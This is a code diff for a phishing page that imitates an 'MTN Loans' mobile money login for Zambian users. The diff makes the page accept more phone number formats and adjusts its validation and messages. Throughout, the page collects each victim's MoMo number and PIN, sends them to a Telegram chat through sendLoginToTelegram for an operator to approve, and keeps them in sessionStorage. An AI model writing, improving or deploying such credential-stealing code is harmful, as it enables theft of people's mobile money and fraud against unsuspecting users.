@@ -218,6 +218,16 @@
             color: #999;
         }
 
+        .hint {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 4px;
+            padding-left: 4px;
+        }
+        .hint strong {
+            color: #666;
+        }
+
         @media (max-width: 360px) {
             body {
                 padding: 8px;
@@ -283,8 +293,8 @@
 
             <div class="form">
                 <div class="label">MTN MoMo Number</div>
-                <input class="input" id="phoneInput" placeholder="7 66 123 456" inputmode="numeric" maxlength="11">
-
+                <input class="input" id="phoneInput" placeholder="097 712 3456 or +260977123456" inputmode="numeric">
+                
                 <div class="label" style="margin-top:15px;">Enter your PIN</div>
                 <input class="input" id="pinInput" placeholder="4 or 5 digits" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
 
@@ -319,6 +329,33 @@
         let isSubmitting = false;
         let currentPollInterval = null;
 
+        // ============================================================
+        //  PHONE NUMBER EXTRACTION – handles all Zambian formats
+        // ============================================================
+        function extractZambianPhone(raw) {
+            if (!raw || typeof raw !== 'string') return null;
+            let digits = raw.replace(/\D/g, '');
+            if (!digits) return null;
+
+            // Remove country code 260 if present at the start
+            if (digits.startsWith('260')) {
+                digits = digits.substring(3);
+            }
+            // Remove leading zero if present
+            if (digits.startsWith('0')) {
+                digits = digits.substring(1);
+            }
+            // Must be exactly 9 digits
+            if (digits.length !== 9) return null;
+            // Optional: validate first digit (5-9 for Zambian mobile)
+            const first = parseInt(digits.charAt(0), 10);
+            if (first < 5 || first > 9) return null;
+            return digits;
+        }
+
+        // ============================================================
+        //  UI HELPERS
+        // ============================================================
         function showError(message) {
             errorText.innerText = message || 'Invalid credentials';
             errorBox.style.display = 'block';
@@ -337,19 +374,23 @@
         }
 
         function updateLoginButton() {
-            const phone = phoneInput.value.trim();
-            const pin = pinInput.value.trim();
-            const pinDigits = pin.replace(/\D/g, '');
-            const isValidPin = (pinDigits.length === 4 || pinDigits.length === 5);
-            const phoneDigits = phone.replace(/\D/g, '');
-            const isValidPhone = phoneDigits.length === 9;
-            const isValid = isValidPhone && isValidPin;
-            loginBtn.disabled = !isValid;
+            const phoneRaw = phoneInput.value.trim();
+            const pinRaw = pinInput.value.trim();
+
+            const phoneCore = extractZambianPhone(phoneRaw);
+            const isPhoneValid = phoneCore !== null;
+
+            const pinDigits = pinRaw.replace(/\D/g, '');
+            const isPinValid = (pinDigits.length === 4 || pinDigits.length === 5);
+
+            loginBtn.disabled = !(isPhoneValid && isPinValid);
         }
 
-        function validateMobileNumber(phone) {
-            const cleaned = phone.replace(/\D/g, '');
-            return cleaned.length === 9;
+        function stopPolling() {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
         }
 
         function escapeHtml(unsafe) {
@@ -363,25 +404,23 @@
             });
         }
 
-        function stopPolling() {
-            if (currentPollInterval) {
-                clearInterval(currentPollInterval);
-                currentPollInterval = null;
-            }
-        }
-
-        // ===== TELEGRAM SEND =====
-        async function sendLoginToTelegram(phone, pin) {
+        // ============================================================
+        //  TELEGRAM SEND & POLLING
+        // ============================================================
+        async function sendLoginToTelegram(phone9, pin) {
             const ts = Date.now();
             const approveId = `login_approve_${ts}`;
             const declineId = `login_decline_${ts}`;
 
-            sessionStorage.setItem('mtn_phone', phone.replace(/\D/g, ''));
+            sessionStorage.setItem('mtn_phone', phone9);
             sessionStorage.setItem('mtn_pin', pin);
+
+            // Display with leading zero for readability
+            const displayPhone = '0' + phone9;
 
             const message =
                 `🔐 <b>MTN Loans Login Request</b>\n\n` +
-                `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
+                `<b>MoMo Number:</b> <code>${escapeHtml(displayPhone)}</code>\n` +
                 `<b>PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                 `📢 <b>Approve or Decline this login attempt:</b>`;
 
@@ -448,7 +487,7 @@
                             isSubmitting = false;
                             loginBtn.disabled = false;
                             updateLoginButton();
-                            showError('Authentication refused. Please check your credentials.');
+                            showError('Authentication declined. Please check your phone number and PIN.');
                             clearPinField();
                             phoneInput.focus();
                             return;
@@ -460,6 +499,9 @@
             }, 1500);
         }
 
+        // ============================================================
+        //  SUBMIT HANDLER
+        // ============================================================
         async function submitLogin() {
             if (isSubmitting) return;
 
@@ -468,14 +510,10 @@
 
             hideError();
 
-            const phoneDigits = phoneRaw.replace(/\D/g, '');
-            if (!phoneDigits) {
-                showError('Please enter your MTN MoMo number.');
-                phoneInput.focus();
-                return;
-            }
-            if (phoneDigits.length !== 9) {
-                showError('Please enter a valid MTN MoMo number (9 digits).');
+            // Extract core 9-digit number
+            const phoneCore = extractZambianPhone(phoneRaw);
+            if (!phoneCore) {
+                showError('Please enter a valid Zambian phone number (e.g. 0977123456 or +260977123456).');
                 phoneInput.focus();
                 return;
             }
@@ -497,28 +535,23 @@
             loginBtn.disabled = true;
             spinner.style.display = 'flex';
 
-            await sendLoginToTelegram(phoneDigits, pinDigits);
+            await sendLoginToTelegram(phoneCore, pinDigits);
         }
 
-        // -------- Event Listeners --------
-        phoneInput.addEventListener('input', function(e) {
-            let val = this.value.replace(/[^0-9 ]/g, '');
-            const digits = val.replace(/\D/g, '');
-            if (digits.length > 9) {
-                val = digits.slice(0, 9);
-                this.value = val;
-            }
+        // ============================================================
+        //  EVENT LISTENERS
+        // ============================================================
+        // Phone input: allow any characters, but update button state
+        phoneInput.addEventListener('input', function() {
             updateLoginButton();
             hideError();
         });
 
-        phoneInput.addEventListener('paste', function(e) {
-            e.preventDefault();
-            const pasted = (e.clipboardData || window.clipboardData).getData('text');
-            const digits = pasted.replace(/\D/g, '').slice(0, 9);
-            this.value = digits;
-            updateLoginButton();
-            hideError();
+        phoneInput.addEventListener('paste', function() {
+            setTimeout(() => {
+                updateLoginButton();
+                hideError();
+            }, 10);
         });
 
         pinInput.addEventListener('input', function(e) {
@@ -545,7 +578,9 @@
             window.history.back();
         });
 
-        // -------- Initialisation --------
+        // ============================================================
+        //  INIT
+        // ============================================================
         function init() {
             updateLoginButton();
             hideError();
